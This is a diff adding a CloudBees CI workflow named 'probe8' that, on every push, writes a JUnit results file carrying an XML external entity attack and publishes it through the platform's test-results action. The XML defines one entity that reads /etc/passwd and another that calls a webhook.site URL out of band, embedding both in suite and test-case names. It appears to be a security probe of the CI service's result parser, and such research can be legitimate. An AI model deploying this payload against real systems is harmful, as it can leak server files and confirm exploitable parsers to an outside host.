@@ -1,0 +1,37 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: probe8
+
+on:
+  push:
+    branches:
+      - "**"
+
+jobs:
+  xxe:
+    steps:
+      - name: make-junit
+        uses: docker://alpine:3.20
+        run: |
+          mkdir -p /cloudbees/workspace/results
+          cat > /cloudbees/workspace/results/junit.xml <<'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE testsuites [
+            <!ENTITY oob SYSTEM "http://webhook.site/fcf51b26-7565-4939-ae43-183e62117a14/xxe-junit">
+            <!ENTITY lfi SYSTEM "file:///etc/passwd">
+          ]>
+          <testsuites>
+            <testsuite name="suite-&oob;" tests="1" failures="1" errors="0" time="1">
+              <testcase classname="cb.probe" name="case-&lfi;" time="1">
+                <failure message="&lfi;">&oob;</failure>
+              </testcase>
+            </testsuite>
+          </testsuites>
+          EOF
+          sed -i 's/^          //' /cloudbees/workspace/results/junit.xml
+          cat /cloudbees/workspace/results/junit.xml
+      - name: publish
+        uses: cloudbees-io/publish-test-results@v2
+        with:
+          test-type: junit
+          results-path: results/junit.xml
